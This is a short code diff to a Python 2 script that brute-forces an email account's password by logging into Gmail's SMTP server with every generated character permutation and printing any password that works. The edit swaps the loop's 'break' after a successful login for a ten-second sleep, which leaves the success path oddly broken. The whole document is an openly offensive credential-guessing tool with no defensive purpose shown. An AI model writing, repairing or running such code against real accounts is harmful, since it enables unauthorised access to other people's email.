@@ -1,5 +1,7 @@
 import itertools 
 import smtplib 
+import time
+
 smtpserver = smtplib.SMTP("smtp.gmail.com", 587) 
 smtpserver.ehlo() 
 smtpserver.starttls() 
@@ -14,6 +16,6 @@ def print_perms(chars, minlen, maxlen):
 try: 
     smtpserver.login(user, symbols) 
     print "[+] Password Cracked: %s" % symbols 
-    break; 
+    time.sleep(10)
 except smtplib.SMTPAuthenticationError: 
     print "[!] Password Inccorect: %s" % symbols
